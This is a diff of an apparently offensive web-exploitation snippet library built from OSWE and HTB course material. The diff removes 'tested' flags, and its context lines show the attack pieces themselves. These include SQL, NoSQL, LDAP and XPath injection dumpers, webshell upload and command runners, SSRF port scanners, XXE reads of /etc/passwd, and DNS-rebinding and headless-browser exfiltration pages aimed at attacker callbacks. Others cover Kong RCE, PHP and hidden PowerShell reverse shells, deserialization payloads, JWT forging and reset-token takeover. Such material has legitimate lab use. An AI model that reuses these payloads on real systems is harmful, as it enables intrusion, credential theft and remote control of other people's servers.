@@ -127,17 +127,12 @@
     <div class="panel-head"><h2>Pecas</h2><span id="result-count" class="badge">0</span></div>
     <div class="controls">
       <div id="category-tabs" class="category-grid"></div>
-      <select id="tested-filter" aria-label="tested filter">
-        <option value="all">mostrar tudo</option>
-        <option value="untested">so tested:false</option>
-        <option value="tested">so tested:true</option>
-      </select>
     </div>
     <div id="piece-list" class="list"></div>
   </section>
 
   <main class="panel">
-    <div class="panel-head"><h2>Peca ativa</h2><span id="active-tested" class="badge warn">tested:false</span></div>
+    <div class="panel-head"><h2>Peca ativa</h2></div>
     <div id="active-meta" class="meta"></div>
     <div class="toolbar">
       <button id="view-add-step" class="primary">add step</button>
@@ -221,7 +216,6 @@ var PIECES = [
     editFirst:["TARGET","USERNAME","PASSWORD","VERIFY_TLS","TIMEOUT"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`#!/usr/bin/env python3
 import argparse
 import base64
@@ -311,7 +305,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["METHOD","PATH","HEADERS","DATA"],
     dependsOn:[],
     sourceRefs:["rizemon/exploit-writing-for-oswe","Skeleton Scripts"],
-    tested:false,
     code:String.raw`def send_raw_request():
     METHOD = "POST"              # EDIT
     PATH = "/endpoint"           # EDIT
@@ -338,7 +331,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["ACTIONLIST","WORDLIST","BASE_PREFIX","METHODS","IGNORE_STATUS"],
     dependsOn:[],
     sourceRefs:["user snippet"],
-    tested:false,
     code:String.raw`def discover_route_action_matrix():
     ACTIONLIST = "actions.txt"        # EDIT action names, one per line
     WORDLIST = "words.txt"            # EDIT controller/path words, one per line
@@ -406,7 +398,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["PATH","BASE_PARAMS","TEST_PARAM","TEST_HEADER","PAYLOAD","CACHE_HEADERS"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 6"],
-    tested:false,
     code:String.raw`def web_cache_poison_probe():
     PATH = "/index.php"                         # EDIT
     BASE_PARAMS = {"language": "en"}            # EDIT keyed params needed for victim cache key
@@ -457,7 +448,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["PATH","PARAM","BASE_VALUE","MODE","BODY_PAYLOAD"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 7"],
-    tested:false,
     code:String.raw`def crlf_response_splitting_probe():
     PATH = "/"                                  # EDIT
     PARAM = "target"                            # EDIT parameter reflected into header/log
@@ -494,7 +484,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["LOGIN_PATH","PRE_LOGIN_PATH","USER_FIELD","PASS_FIELD","SUCCESS_TEXT","EXTRA_DATA"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def login_form_basic():
     LOGIN_PATH = "/login"            # EDIT: e.g. /opencrx-core-CRX/j_security_check
     PRE_LOGIN_PATH = ""              # EDIT optional GET first, e.g. /opencrx-core-CRX/Login.jsp
@@ -533,7 +522,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["LOGIN_PATH","TOKEN_REGEX","TOKEN_FIELD","USER_FIELD","PASS_FIELD","SUCCESS_TEXT"],
     dependsOn:[],
     sourceRefs:["Skeleton Scripts"],
-    tested:false,
     code:String.raw`def login_form_csrf():
     LOGIN_PATH = "/login"                         # EDIT
     TOKEN_REGEX = r'name="csrf" value="([^"]+)"'  # EDIT
@@ -570,7 +558,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["LOGIN_PATH","TOKEN_KEY","SUCCESS_CODES"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def login_json_bearer():
     LOGIN_PATH = "/api/login"       # EDIT
     TOKEN_KEY = "token"             # EDIT
@@ -599,7 +586,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["AUTH_MODE","COOKIE_HEADER","HEADER_NAME","HEADER_VALUE","CHECK_PATH","SUCCESS_TEXT"],
     dependsOn:[],
     sourceRefs:["OSWE ch07 pattern","v4"],
-    tested:false,
     code:String.raw`def login_basic_cookie_static():
     AUTH_MODE = "basic"                    # EDIT: basic/cookie/header/none
     CHECK_PATH = "/"                       # EDIT endpoint that proves auth
@@ -646,7 +632,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["COOKIE_NAME","SECRET","PAYLOAD"],
     dependsOn:["helper-encoders"],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def forge_jwt_cookie():
     COOKIE_NAME = "session"  # EDIT
     SECRET = "secret"        # EDIT: only for weak HS256 shape
@@ -672,7 +657,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["MODE","COOKIE_NAME","CLAIMS","KID","JWKS_URL","HEADER_STYLE"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 3"],
-    tested:false,
     code:String.raw`def forge_jwt_rsa_jwk_jku():
     # Needs: pip install pyjwt cryptography
     import base64
@@ -743,7 +727,6 @@ def callback_url(path="", scheme="http"):
     editFirst:["TOKEN","GET_TOKEN_PATH","KEY","CIPHER","MODIFICATIONS_JSON"],
     dependsOn:[],
     sourceRefs:["Jose_Abreu OSWE 10-Challenge codex.py","Jose_Abreu OSWE 10-Challenge claude.py"],
-    tested:false,
     code:String.raw`def forge_node_aes_json_token():
     import subprocess
 
@@ -830,7 +813,6 @@ if (input.operation === "decrypt") {
     editFirst:["REQUEST_RESET_PATH","TOKEN_SOURCE_PATH","RESET_PATH","ADMIN_USER"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def reset_token_takeover():
     REQUEST_RESET_PATH = "/forgot"       # EDIT
     TOKEN_SOURCE_PATH = "/debug/mail"    # EDIT
@@ -862,7 +844,6 @@ if (input.operation === "decrypt") {
     editFirst:["INJECT_PATH","TRUE_MARKER","QUERY","MAX_LEN","STRATEGY","CHAR_EXPR","LEN_CONDITION"],
     dependsOn:[],
     sourceRefs:["v4","Skeleton Scripts"],
-    tested:false,
     code:String.raw`def dump_boolean_oracle():
     INJECT_PATH = "/search?q="                         # EDIT
     TRUE_MARKER = "Welcome"                            # EDIT
@@ -927,7 +908,6 @@ if (input.operation === "decrypt") {
     editFirst:["INJECT_PATH","SLEEP_SECONDS","QUERY","THRESHOLD"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def dump_time_oracle():
     INJECT_PATH = "/item?id=1"       # EDIT
     SLEEP_SECONDS = 3                # EDIT
@@ -966,7 +946,6 @@ if (input.operation === "decrypt") {
     editFirst:["INJECT_PATH","COLUMN_COUNT","VISIBLE_COL","QUERY","MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def dump_sqli_union():
     INJECT_PATH = "/item?id="                 # EDIT
     COLUMN_COUNT = 3                          # EDIT
@@ -996,7 +975,6 @@ if (input.operation === "decrypt") {
     editFirst:["INJECT_PATH","WEBROOT_PATH","SHELL_URL","STACKED_PAYLOAD"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def sqli_stacked_webshell():
     INJECT_PATH = "/item?id="                         # EDIT
     WEBROOT_PATH = "/var/www/html/shell.php"          # EDIT
@@ -1024,7 +1002,6 @@ if (input.operation === "decrypt") {
     editFirst:["LOGIN_PATH","FIELD","TRUE_MARKER","CHARSET","MAX_LEN"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def dump_nosql_regex():
     LOGIN_PATH = "/login"        # EDIT
     FIELD = "password"           # EDIT
@@ -1060,7 +1037,6 @@ if (input.operation === "decrypt") {
     editFirst:["SEARCH_PATH","PARAM","ATTR","TRUE_MARKER","CHARSET"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def dump_ldap_prefix():
     SEARCH_PATH = "/search"      # EDIT
     PARAM = "q"                  # EDIT
@@ -1095,7 +1071,6 @@ if (input.operation === "decrypt") {
     editFirst:["ENDPOINT","PARAM","TRUE_MARKER","XPATH_EXPR","CHARSET"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def dump_xpath_boolean():
     ENDPOINT = "/login"          # EDIT
     PARAM = "username"           # EDIT
@@ -1134,7 +1109,6 @@ if (input.operation === "decrypt") {
     editFirst:["READ_PATH","PARAM","FILE_PATH","PREFIX","BYPASS_MODE"],
     dependsOn:[],
     sourceRefs:["v4","Jose_Abreu OSWE 10-Challenge claude.py"],
-    tested:false,
     code:String.raw`def read_file_traversal():
     READ_PATH = "/download"           # EDIT
     PARAM = "file"                    # EDIT
@@ -1169,7 +1143,6 @@ if (input.operation === "decrypt") {
     editFirst:["SSRF_PATH","URL_PARAM","METADATA_URL","--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def ssrf_oob_probe():
     SSRF_PATH = "/fetch"                         # EDIT
     URL_PARAM = "url"                            # EDIT
@@ -1194,7 +1167,6 @@ if (input.operation === "decrypt") {
     editFirst:["REBIND_DOMAIN","FETCH_PATH","CALLBACK","CHUNK_SIZE","DNS_REBINDER_CMD"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 10"],
-    tested:false,
     code:String.raw`def build_dns_rebinding_exfil_html():
     require_callback()
     REBIND_DOMAIN = "www.attacker.test"      # EDIT domain controlled by you
@@ -1235,7 +1207,6 @@ if (input.operation === "decrypt") {
     editFirst:["STORE_PATH","RENDER_PATH","FIELD","BASE_DATA","INTERNAL_HOST","PORTS"],
     dependsOn:[],
     sourceRefs:["Skeleton Scripts"],
-    tested:false,
     code:String.raw`def renderer_ssrf_port_scan():
     STORE_PATH = "/actions/store-or-update.php"  # EDIT first request stores HTML
     RENDER_PATH = "/actions/pdf.php"             # EDIT second request triggers render/fetch
@@ -1267,7 +1238,6 @@ if (input.operation === "decrypt") {
     editFirst:["SSRF_PATH","JSON_FIELD","INTERNAL_HOST","PORTS","OPEN_MARKERS","CLOSED_MARKERS"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.4"],
-    tested:false,
     code:String.raw`def ssrf_json_port_scan():
     SSRF_PATH = "/files/import"                 # EDIT endpoint that fetches JSON url
     JSON_FIELD = "url"                          # EDIT
@@ -1312,7 +1282,6 @@ if (input.operation === "decrypt") {
     editFirst:["SSRF_PATH","JSON_FIELD","INTERNAL_BASE","CANDIDATES","OPEN_MARKERS"],
     dependsOn:[],
     sourceRefs:["Notion 9.5"],
-    tested:false,
     code:String.raw`def ssrf_path_param_scanner():
     SSRF_PATH = "/files/import"             # EDIT endpoint that fetches JSON url
     JSON_FIELD = "url"                      # EDIT
@@ -1365,7 +1334,6 @@ if (input.operation === "decrypt") {
     editFirst:["SSRF_PATH","JSON_FIELD","MODE","HOST_TEMPLATE","PORT","INTERESTING_MARKERS"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.4"],
-    tested:false,
     code:String.raw`def ssrf_internal_subnet_scan():
     SSRF_PATH = "/files/import"       # EDIT endpoint that fetches JSON url
     JSON_FIELD = "url"                # EDIT
@@ -1415,7 +1383,6 @@ if (input.operation === "decrypt") {
     editFirst:["INTERNAL_URLS","CALLBACK","CHUNK_SIZE"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.6"],
-    tested:false,
     code:String.raw`def build_headless_fetch_exfil_html():
     INTERNAL_URLS = [                         # EDIT internal URLs visible to renderer
         "http://127.0.0.1:8001/",
@@ -1453,7 +1420,6 @@ if (input.operation === "decrypt") {
     editFirst:["DELIVERY_MODE","IMPORT_PATH","RENDER_PATH","PUBLIC_HTML_URL","API_KEY"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.6"],
-    tested:false,
     code:String.raw`def deliver_url_to_render_service():
     DELIVERY_MODE = "ssrf-import"       # EDIT: ssrf-import | direct-render-get | direct-render-post
     IMPORT_PATH = "/files/import"       # EDIT first SSRF endpoint
@@ -1492,7 +1458,6 @@ if (input.operation === "decrypt") {
     editFirst:["KONG_ADMIN","SERVICE_NAME","ROUTE_PATH","LUA_PAYLOAD","--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.7"],
-    tested:false,
     code:String.raw`def build_kong_prefunction_rce_html():
     require_callback()
     KONG_ADMIN = "http://127.0.0.1:8001"     # EDIT internal Kong Admin API as seen by headless browser
@@ -1544,7 +1509,6 @@ if (input.operation === "decrypt") {
     editFirst:["ROUTE_PATH","METHOD"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.7"],
-    tested:false,
     code:String.raw`def run_cmd(cmd=""):
     ROUTE_PATH = "/oswe-route"     # EDIT route created by Kong plugin payload
     METHOD = "GET"                 # EDIT
@@ -1565,7 +1529,6 @@ if (input.operation === "decrypt") {
     editFirst:["XML_PATH","BODY_TEMPLATE","RAW_XML","FILE_PATH","AUTH_MODE"],
     dependsOn:["helper-xxe-response-extractor"],
     sourceRefs:["v4","Notion module 6.3.7","Notion module 6.3.8"],
-    tested:false,
     code:String.raw`def xxe_inline_file_read(file_path=None):
     XML_PATH = "/api/xml"                 # EDIT
     FILE_PATH = "/etc/passwd"             # EDIT
@@ -1605,7 +1568,6 @@ if (input.operation === "decrypt") {
     editFirst:["PATHS","OUTPUT_FILE"],
     dependsOn:["xxe-inline-file-read","helper-save-output"],
     sourceRefs:["challenge6.py"],
-    tested:false,
     code:String.raw`def xxe_enum_paths():
     PATHS = [                         # EDIT
         "/etc/passwd",
@@ -1641,7 +1603,6 @@ if (input.operation === "decrypt") {
     editFirst:["XML_PATH","BODY_TEMPLATE","RAW_XML","FILE_PATH","DTD_NAME","AUTH_MODE","--lhost","--lport"],
     dependsOn:["helper-embedded-file-server","helper-xxe-response-extractor"],
     sourceRefs:["v4","Notion module 6.3.7","Notion module 6.3.8"],
-    tested:false,
     code:String.raw`def xxe_external_dtd():
     XML_PATH = "/api/xml"                 # EDIT
     FILE_PATH = "/etc/passwd"             # EDIT
@@ -1690,7 +1651,6 @@ if (input.operation === "decrypt") {
     editFirst:["MARKERS"],
     dependsOn:[],
     sourceRefs:["challenge6.py"],
-    tested:false,
     code:String.raw`def extract_xxe_content(response_text, target_path=""):
     import html as html_lib
 
@@ -1723,7 +1683,6 @@ if (input.operation === "decrypt") {
     editFirst:["UPLOAD_PATH","SHELL_URL","FIELD","FILENAME","SHELL_BODY"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def upload_webshell():
     UPLOAD_PATH = "/upload"                 # EDIT
     SHELL_URL = "/uploads/shell.php"        # EDIT
@@ -1753,7 +1712,6 @@ if (input.operation === "decrypt") {
     editFirst:["SHELL_PATH","CMD_PARAM","OUTPUT_REGEX"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def run_cmd(cmd):
     SHELL_PATH = "/uploads/shell.php"  # EDIT
     CMD_PARAM = "cmd"                  # EDIT
@@ -1781,7 +1739,6 @@ if (input.operation === "decrypt") {
     editFirst:["CMD_PATH","PARAM","SEPARATOR","MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def run_cmd(cmd):
     CMD_PATH = "/ping"        # EDIT
     PARAM = "host"            # EDIT
@@ -1809,7 +1766,6 @@ if (input.operation === "decrypt") {
     editFirst:["TRIGGER_PATH","JSON_BODY","INJECT_FIELD","INJECTION_TEMPLATE","FILE_PATH","DELAY","CHARSET"],
     dependsOn:[],
     sourceRefs:["Skeleton Scripts"],
-    tested:false,
     code:String.raw`def dump_blind_cmd_time():
     import shlex
     TRIGGER_PATH = "/api/service/ping"            # EDIT
@@ -1862,7 +1818,6 @@ if (input.operation === "decrypt") {
     editFirst:["ENDPOINT","FIELD","COMMAND","PAYLOADS","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["HTB Senior Web module 9"],
-    tested:false,
     code:String.raw`def node_eval_json_injection():
     ENDPOINT = "/api/service/generate"       # EDIT
     FIELD = "text"                           # EDIT field reaching eval/string builder
@@ -1902,7 +1857,6 @@ if (input.operation === "decrypt") {
     editFirst:["MODE","FUNC","COMMAND"],
     dependsOn:[],
     sourceRefs:["OSWE module 11"],
-    tested:false,
     code:String.raw`def php_sq(value):
     return "'" + str(value).replace("\\", "\\\\").replace("'", "\\'") + "'"
 
@@ -1968,7 +1922,6 @@ def build_php_reverse_shell(mode="reflection_url"):
     editFirst:["SUBMIT_PATH","TRIGGER_PATH","METHOD","PAYLOAD_FIELD","MODE","BASE_DATA","SUCCESS_MARKER"],
     dependsOn:["helper-php-eval-filter-payloads"],
     sourceRefs:["OSWE module 11"],
-    tested:false,
     code:String.raw`def send_eval_payload(payload):
     SUBMIT_PATH = "/admin/save-expression"       # EDIT endpoint that stores/sends expression
     TRIGGER_PATH = ""                            # EDIT optional endpoint that later renders/evaluates it
@@ -2030,7 +1983,6 @@ def trigger_reverse_shell():
     editFirst:["SSTI_PATH","PARAM","PAYLOAD_SHAPE"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def run_cmd(cmd):
     SSTI_PATH = "/preview"  # EDIT
     PARAM = "name"          # EDIT
@@ -2055,7 +2007,6 @@ def trigger_reverse_shell():
     editFirst:["ENDPOINT","FIELD","YSOSERIAL_JAR","GADGET","CMD"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def deliver_java_serialized_payload():
     import subprocess
 
@@ -2085,7 +2036,6 @@ def trigger_reverse_shell():
     editFirst:["ENDPOINT","FIELD","CMD","ENCODING"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def deliver_pickle_payload():
     import os
     import pickle
@@ -2119,7 +2069,6 @@ def trigger_reverse_shell():
     editFirst:["ACTION","FIELDS"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def build_csrf_html():
     ACTION = url("/change-email")  # EDIT or set full external URL
     FIELDS = {"email": "attacker@example.com"}  # EDIT
@@ -2151,7 +2100,6 @@ def trigger_reverse_shell():
     editFirst:["--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def start_http_listener(host="0.0.0.0", port=None):
     from http.server import BaseHTTPRequestHandler, HTTPServer
     from urllib.parse import parse_qs, urlparse
@@ -2191,7 +2139,6 @@ def trigger_reverse_shell():
     editFirst:["CERT_FILE","KEY_FILE","PARAM","--lport"],
     dependsOn:[],
     sourceRefs:["Skeleton Scripts"],
-    tested:false,
     code:String.raw`def start_https_b64_json_listener(host="0.0.0.0", port=None):
     import base64
     import json
@@ -2240,7 +2187,6 @@ def trigger_reverse_shell():
     editFirst:["TOKEN_REGEX","--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["Jose_Abreu OSWE 5-Challenge smtp_sink.py"],
-    tested:false,
     code:String.raw`def start_smtp_sink(host="0.0.0.0", port=None):
     import re
     import socket
@@ -2326,7 +2272,6 @@ def trigger_reverse_shell():
     editFirst:["METHOD","PATH","INJECT_IN","INJECT_NAME","PARAMS","BODY","HEADERS","COOKIES","PREFIX","SUFFIX"],
     dependsOn:[],
     sourceRefs:["sqli_poc_kit.py"],
-    tested:false,
     code:String.raw`def send_injected(payload):
     METHOD = "GET"                 # EDIT
     PATH = "/vulnerable"           # EDIT
@@ -2378,7 +2323,6 @@ def trigger_reverse_shell():
     editFirst:["DBMS","SLEEP_SECONDS"],
     dependsOn:[],
     sourceRefs:["sqli_poc_kit.py"],
-    tested:false,
     code:String.raw`def time_sqli_payload(kind, expr="select database()", n=1, pos=1, char_code=65):
     DBMS = "postgres"     # EDIT: postgres/mssql/mysql/oracle
     SLEEP_SECONDS = 5     # EDIT
@@ -2432,7 +2376,6 @@ def trigger_reverse_shell():
     editFirst:["WAF_REGEX","BASE_PAYLOAD","BYPASS_CONDITIONS"],
     dependsOn:[],
     sourceRefs:["OSWE module 12","Jose_Abreu OSWE 12-Challenege mod12_exploit.py"],
-    tested:false,
     code:String.raw`def test_waf_regex_payloads():
     # Use when: WAF rule exposes @rx regex and you need to test payload variants.
     # Edit first: WAF_REGEX, BASE_PAYLOAD, BYPASS_CONDITIONS.
@@ -2478,7 +2421,6 @@ def trigger_reverse_shell():
     editFirst:["EXPR","MAX_LEN","STRATEGY","CHARSET","THRESHOLD"],
     dependsOn:["helper-sqli-transport-injector","helper-time-sqli-dbms-templates"],
     sourceRefs:["sqli_poc_kit.py","Skeleton Scripts"],
-    tested:false,
     code:String.raw`def dump_time_sqli_robust():
     EXPR = "current_database()"  # EDIT
     MAX_LEN = 80                 # EDIT
@@ -2550,7 +2492,6 @@ def trigger_reverse_shell():
     editFirst:[],
     dependsOn:[],
     sourceRefs:["sqli_poc_kit.py"],
-    tested:false,
     code:String.raw`def dollar_quote(value, tag=""):
     value = str(value)
     token = "$" + tag + "$"
@@ -2576,7 +2517,6 @@ def quote_ident(value):
     editFirst:["MODE","REMOTE_PATH","LOCAL_CONTENT","REMOTE_COMMAND","TEMP_TABLE","WAF_BYPASS_CONDITION"],
     dependsOn:["helper-postgres-sql-quoting","helper-sqli-transport-injector"],
     sourceRefs:["sqli_poc_kit.py","Jose_Abreu OSWE 12-Challenege mod12_exploit.py"],
-    tested:false,
     code:String.raw`def postgres_file_program():
     MODE = "read"                       # EDIT: read/write/program
     REMOTE_PATH = "/etc/passwd"          # EDIT
@@ -2616,7 +2556,6 @@ def quote_ident(value):
     editFirst:["DLL_PATH","DLL_B64","LOID","EXPORT_PATH","UDF_NAME","EXPORTED_SYMBOL","TRIGGER_ARGS"],
     dependsOn:["helper-postgres-sql-quoting","helper-sqli-transport-injector"],
     sourceRefs:["OSWE ch04"],
-    tested:false,
     code:String.raw`def postgres_large_object_udf_rce():
     require_callback()
     DLL_PATH = "rev_shell.dll"                  # EDIT compiled PostgreSQL extension, or set "" and use DLL_B64
@@ -2682,7 +2621,6 @@ def quote_ident(value):
     editFirst:["DISPATCH_PATH","CMD_PARAM","CSRF_HEADER","GUEST_CSRF","GUEST_COOKIES"],
     dependsOn:[],
     sourceRefs:["challenge5.py","Google Drive OSWE 5-Challenge"],
-    tested:false,
     code:String.raw`def app_cmd(cmd, params=None):
     DISPATCH_PATH = "/"                 # EDIT
     CMD_PARAM = "cmd"                   # EDIT
@@ -2718,7 +2656,6 @@ def quote_ident(value):
     editFirst:["CMD","INJECT_PARAM","UNION_SELECT","FROM_TABLE","ROW_KEY","PREFIX","SUFFIX","COLLATE"],
     dependsOn:["helper-app-cmd-dispatch-session"],
     sourceRefs:["challenge5.py","Google Drive OSWE 5-Challenge"],
-    tested:false,
     code:String.raw`def dump_union_json_rows(union_select=None, from_table=None, row_key=None):
     CMD = "frappe.utils.global_search.web_search"      # EDIT dispatcher method
     TEXT_PARAM = "text"                                # EDIT normal search text param
@@ -2770,7 +2707,6 @@ def quote_ident(value):
     editFirst:["TARGET_USER","NEW_PASSWORD","FORGOT_CMD","TOKEN_QUERY","UPDATE_PATH"],
     dependsOn:["helper-app-cmd-dispatch-session","union-json-row-extractor"],
     sourceRefs:["challenge5.py"],
-    tested:false,
     code:String.raw`def reset_token_via_sqli():
     TARGET_USER = "admin@example.com"       # EDIT
     NEW_PASSWORD = PASSWORD                 # EDIT via -p/--password
@@ -2801,7 +2737,6 @@ def quote_ident(value):
     editFirst:["SSTI_PATH","PARAM","POPEN_INDEX","CMD_SHAPE"],
     dependsOn:[],
     sourceRefs:["challenge5.py"],
-    tested:false,
     code:String.raw`def run_cmd(cmd):
     SSTI_PATH = "/template/render"  # EDIT
     PARAM = "template"              # EDIT
@@ -2832,7 +2767,6 @@ def quote_ident(value):
     editFirst:["SSTI_PATH","PARAM","START","STOP"],
     dependsOn:[],
     sourceRefs:["challenge5.py"],
-    tested:false,
     code:String.raw`def find_popen_index():
     SSTI_PATH = "/template/render"  # EDIT
     PARAM = "template"              # EDIT
@@ -2860,7 +2794,6 @@ def quote_ident(value):
     editFirst:["CREATE_CMD","RENDER_CMD","DELETE_CMD","DOCTYPE","NAME_FIELD"],
     dependsOn:["helper-app-cmd-dispatch-session"],
     sourceRefs:["challenge5.py"],
-    tested:false,
     code:String.raw`def template_render_payload(payload):
     CREATE_CMD = "client.save"          # EDIT
     RENDER_CMD = "template.render"      # EDIT
@@ -2889,7 +2822,6 @@ def quote_ident(value):
     editFirst:["CMD_PARAM"],
     dependsOn:[],
     sourceRefs:["dotnet.py"],
-    tested:false,
     code:String.raw`def generate_aspx_shell():
     CMD_PARAM = "cmd"  # EDIT
     close_script = "</" + "script>"
@@ -2922,7 +2854,6 @@ void Page_Load(object sender, System.EventArgs e) {{
     editFirst:["FILENAME","--lport","CONTENT"],
     dependsOn:[],
     sourceRefs:["dotnet.py"],
-    tested:false,
     code:String.raw`def start_file_server(content, filename="payload.bin", port=None):
     import http.server
     import os
@@ -2963,7 +2894,6 @@ void Page_Load(object sender, System.EventArgs e) {{
     editFirst:["SCRIPT","--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["dotnet.py"],
-    tested:false,
     code:String.raw`def powershell_encoded(script):
     raw = script.encode("utf-16le")
     return "powershell.exe -NoP -NonI -W Hidden -EncodedCommand " + base64.b64encode(raw).decode()
@@ -2994,7 +2924,6 @@ def powershell_reverse_shell():
     editFirst:["TYPE_AQN","METHOD_NAME","METHOD_PARAMS","TABLE_KEY"],
     dependsOn:[],
     sourceRefs:["dotnet.py"],
-    tested:false,
     code:String.raw`def build_dotnet_odp_payload():
     TYPE_AQN = "Namespace.Type, Assembly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"  # EDIT
     METHOD_NAME = "MethodName"  # EDIT
@@ -3033,7 +2962,6 @@ def powershell_reverse_shell():
     editFirst:["SHELL_NAME","WEBROOT","DELIVERY_COOKIE","--lhost","--lport"],
     dependsOn:["helper-aspx-webshell-generator","helper-embedded-file-server","dotnet-xmlserializer-odp-payload"],
     sourceRefs:["dotnet.py"],
-    tested:false,
     code:String.raw`def dotnet_pullfile_webshell():
     SHELL_NAME = "shell.aspx"                   # EDIT
     WEBROOT = "C:/inetpub/wwwroot/app"          # EDIT
@@ -3064,7 +2992,6 @@ def powershell_reverse_shell():
     editFirst:[],
     dependsOn:[],
     sourceRefs:["Notion module 6.2.4","OpenCRXToken.java"],
-    tested:false,
     code:String.raw`class JavaRandom:
     MULT = 0x5DEECE66D
     ADD = 0xB
@@ -3105,7 +3032,6 @@ def java_base62(seed_ms, length=40):
     editFirst:["RESET_PATH","CONFIRM_PATH","TOKEN_LEN","SKEW_MS","MANUAL_TIMEZONE","FAIL_MARKER","PROVIDER","SEGMENT"],
     dependsOn:["helper-java-random-base62"],
     sourceRefs:["Notion module 6.2.5","challenge-62.py"],
-    tested:false,
     code:String.raw`def time_seeded_reset_takeover():
     RESET_PATH = "/opencrx-core-CRX/RequestPasswordReset.jsp"          # EDIT
     CONFIRM_PATH = "/opencrx-core-CRX/PasswordResetConfirm.jsp"        # EDIT
@@ -3201,7 +3127,6 @@ def java_base62(seed_ms, length=40):
     editFirst:["CMD_PARAM","OS_MODE","REMOTE_PATH","VARBINARY_SIZE"],
     dependsOn:["helper-encoders"],
     sourceRefs:["Notion module 6.3.9","Notion module 6.4.2"],
-    tested:false,
     code:String.raw`def build_jsp_cmd_shell():
     CMD_PARAM = "cmd"          # EDIT
     OS_MODE = "linux"          # EDIT: "linux" or "windows"
@@ -3255,7 +3180,6 @@ def hsqldb_write_file_sql(remote_path):
     editFirst:["JDBC_JAR","JDBC_URL","DB_USER","DB_PASSWORD","SQL"],
     dependsOn:[],
     sourceRefs:["challenge6.py"],
-    tested:false,
     code:String.raw`def jdbc_run_sql(sql=None):
     import os
     import subprocess
@@ -3338,7 +3262,6 @@ public class JdbcSqlRunner {
     editFirst:["COMMANDS","PROOF_PATHS"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def proof():
     COMMANDS = ["whoami", "hostname", "id"]  # EDIT
     PROOF_PATHS = []                         # EDIT: ["/etc/passwd", "C:\\proof.txt"]
@@ -3367,7 +3290,6 @@ public class JdbcSqlRunner {
     editFirst:["POLLUTE_PATH","TRIGGER_PATH","POLLUTION_BODY","SUCCESS_MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def prototype_pollution_admin():
     POLLUTE_PATH = "/api/profile"        # EDIT
     TRIGGER_PATH = "/admin"              # EDIT
@@ -3394,7 +3316,6 @@ public class JdbcSqlRunner {
     editFirst:["MODE","COMMAND","PROPERTY","VALUE"],
     dependsOn:[],
     sourceRefs:["Notion Guacamole module","OSWE ch11"],
-    tested:false,
     code:String.raw`def build_prototype_pollution_payload(mode="ejs", command="id"):
     MODE = mode                              # EDIT: admin/ejs/handlebars/custom
     COMMAND = command                        # EDIT command for RCE payloads
@@ -3442,7 +3363,6 @@ public class JdbcSqlRunner {
     editFirst:["TOKEN_PATH","POLLUTION_PATH","PAYLOAD_MODE","TOKEN_KEY","TRIGGER_PATHS","COMMAND"],
     dependsOn:["helper-prototype-pollution-payloads"],
     sourceRefs:["Notion Guacamole module","OSWE ch11"],
-    tested:false,
     code:String.raw`def prototype_token_pollute_trigger():
     TOKEN_PATH = "/api/tokens"                 # EDIT endpoint that accepts JSON and returns a token
     TOKEN_KEY = "token"                        # EDIT JSON key; set "" to use TOKEN_REGEX
@@ -3509,7 +3429,6 @@ public class JdbcSqlRunner {
     editFirst:["WS_PATH_OR_URL","MESSAGE","EXPECT","ORIGIN"],
     dependsOn:[],
     sourceRefs:["v4"],
-    tested:false,
     code:String.raw`def websocket_json_trigger():
     import websocket  # pip install websocket-client
 
@@ -3541,7 +3460,6 @@ public class JdbcSqlRunner {
     editFirst:["WS_PATH_OR_URL","KEY","TASK","DATA","EXPECT"],
     dependsOn:[],
     sourceRefs:["module 7 scripts","PDF module"],
-    tested:false,
